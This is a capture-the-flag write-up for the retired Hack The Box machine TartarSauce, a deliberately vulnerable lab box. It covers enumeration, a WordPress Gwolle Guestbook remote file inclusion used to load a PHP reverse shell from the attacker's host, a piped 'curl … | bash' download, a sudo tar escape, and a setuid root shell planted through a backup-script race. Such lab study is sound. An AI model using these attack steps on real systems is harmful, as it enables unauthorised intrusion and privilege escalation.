# TartarSauce

This is the write-up for the box TartarSauce that got retired at the 20th October 2018.
My IP address was 10.10.14.12 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.88    tartarsauce.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/tartarsauce.nmap 10.10.10.88
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
```

## Checking HTTP (Port 80)

On the web page is ASCII art of a TartarSauce bottle and nothing interesting in the HTML source code.
The initial Nmap scan found _robots.txt_ with 5 different directories:
- /webservices/tar/tar/source/
  - HTTP error code _404 Not Found_
- /webservices/monstra-3.0.4/
  - Blog page powered by **Monstra 3.0.4**, which is an open-source CMS
  - Login page on _/webservices/monstra-3.0.4/admin/_
- /webservices/easy-file-uploader/
  - HTTP error code _404 Not Found_
- /webservices/developmental/
  - HTTP error code _404 Not Found_
- /webservices/phpmyadmin/
  - HTTP error code _404 Not Found_

Only the **Monstra** directory responses back and when trying out some default credentials at the login page, the credentials _admin:admin_ work.
After analyzing the platform for a while, it seems like that it is not possible to modify any files nor upload anything to gain command execution.

Lets search for more hidden paths in _/webservices_ with **Gobuster**:
```markdown
gobuster -u http://10.10.10.88/webservices dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds one more directory called _/wp_ where it hosts a **WordPress** page, but it looks broken.
In the HTML source code, there is a mistake about the absolute URLs with wrong syntax:
```html
(...)
<link rel="alternate" type="application/rss+xml" title="Test blog &raquo; Feed" href="http:/10.10.10.88/webservices/wp/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="Test blog &raquo; Comments Feed" href="http:/10.10.10.88/webservices/wp/index.php/comments/feed/" />
(...)
```

They are all missing a slash (/) character in _"http:/"_. To load the page correctly, it is possible to configure a local proxy like **Burpsuite** to replace this string with the correct syntax:

![Burpsuite match and replace](https://kyuu-ji.github.io/htb-write-up/tartarsauce/tartarsauce_web-1.png)

After refreshing the web page, it loads the scripts and looks better.
The tool **Wpscan** is practical, to scan WordPress pages, plugins, etc. for vulnerabilities:
```markdown
wpscan --url http://10.10.10.88/webservices/wp -e ap
```

It may find the plugin _Gwolle Guestbook <= 2.5.3_ and when searching for vulnerabilities with **Searchsploit**, it finds a **Remote File Inclusion** vulnerability:
```markdown
searchsploit gwolle

# Output
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion
```

It works by sending a request to the following path:
```markdown
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```

Lets test this with our local client:
```markdown
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.12/test
```

After sending the request, the listener on my IP and port 80 gets a connection from the box and the vulnerability appends _wp-load.php_ at the end of the request:
```markdown
Ncat: Connection from 10.10.10.88:42002.
GET /testwp-load.php HTTP/1.0
Host: 10.10.14.12
Connection: close
```

This means the RFI works and by sending PHP code, it is possible to get a reverse shell session on the box.
The reverse shell I will be using is _php-reverse-shell.php_ from the **Laudanum** scripts, but it has to be renamed to _wp-load.php_.
```markdown
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.12/
```

After sending it, _wp-load.php_ gets appended to the request, downloads the PHP reverse shell and the listener on my IP and port 9001 starts a connection on the box as _www-data_.

## Privilege Escalation

To get an attack surface on the box, any **Linux Enumeration Script** should be run:
```markdown
curl 10.10.14.12/LinEnum.sh | bash
```

The sudo privileges of _www-data_ is allowing the execution of `tar` as the user _onuma_ without a password:
```markdown
sudo -l

# Output
(...)
User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

Checking on [GTFOBins](https://gtfobins.github.io/) that `tar` can run system commands with `sudo` in the context of another user:
```markdown
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

This starts a bash session as _onuma_.

### Privilege Escalation to root

After executing the **Linux Enumeration Script** again as _onuma_, we find that there are running **Systemd timers**.
One of those is a non-default timer called _backuperer.timer_ that runs every five minutes.

Lets locate what it does:
```markdown
locate backuperer
```

It was found in _/usr/sbin/backuperer_ and is a bash script that does the following every five minutes:
1. Deletes created files in _/var/tmp_
2. `tar` _/var/www/html_ to _/var/tmp/$RANDOM_NAME_ in the background
3. `sleep` for 30 seconds
4. Extract created files and integrity check between _/var/www/html_ and _/var/tmp/check/var/www/html_ with `diff`
5. If integrity check is successful, exit with error exit code (2). Else, delete files and exit with successful exit code (0)

If a directory is not valid, it will fail and delete the files.
If all directories exist, it will exit out of the program and what we have to figure out now, is how to make the integrity check fail to get to that state.
To do that, we need to create an archive that has _/var/www/html_ in it and when its getting extracted, it adds the directories and the `diff` command becomes valid.

```markdown
cd /var/tmp
mkdir -p var/www/html
```

To get command execution we place a binary with the _setuid bit_ in there, because `tar` keeps the file permissions even after extracting.
So when it gets extracted, the binary will keep the _setuid bit_ and is executable as root.

I will compile this code that creates a binary with the correct file permission that runs _/bin/sh_:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( int argc, char *argv[] )
{
        setreuid(0, 0);
        execve("/bin/sh", NULL, NULL);
}   
```
```markdown
gcc -m32 -o shell exec.c
```

Moving _shell_ into local _var/www/html_ directory and `tar` up the directory:
```markdown
mkdir var/www/html
mv shell var/www/html
chmod 6555 var/www/html/shell
tar -zcvf shell.tar.gz var/
```

Uploading _shell.tar.gz_ to the directory _/var/tmp/var/www/html_ on the box:
```markdown
# On client
nc -lvnp 9002 < shell.tar.gz

# On the box
nc 10.10.14.12 9002 > shell.tar.gz
```

Now waiting until the _backuperer_ job runs. To follow the time, the `watch` command is useful:
```markdown
watch -n 1 'systemctl list-timers'
```

When it runs, it creates a hidden file with a random name in _/var/tmp/_ and we have to rename our _shell.tar.gz_ as the name of that new file:
```markdown
cp shell.tar.gz .7c1f2149bd7924dc3f98e0b04e64bbda5ecf85f0
```

This has to be done before the time hits the 30 seconds mark, because then it creates the folder _check_ in which the binary got extracted into that is now owned by root and has the setuid bit set. This is the binary created by us to execute now:
```markdown
cd /var/tmp/check/var/www/html

./shell
```

After executing _shell_ a shell session as root starts!
